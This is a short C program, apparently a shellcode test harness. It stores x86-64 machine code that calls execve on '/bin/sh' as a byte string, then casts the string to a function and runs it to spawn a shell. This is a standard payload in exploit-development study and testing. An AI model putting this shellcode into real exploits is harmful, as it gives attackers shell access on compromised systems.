#include <stdio.h>

char shellcode[] = "\xeb\x0e\x48\x31\xc0\x48\x89\xc6\x48\x89\xc2\xb0\x3b\x5f\x0f\x05\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main(void) {


	(*(void(*)()) shellcode)();
}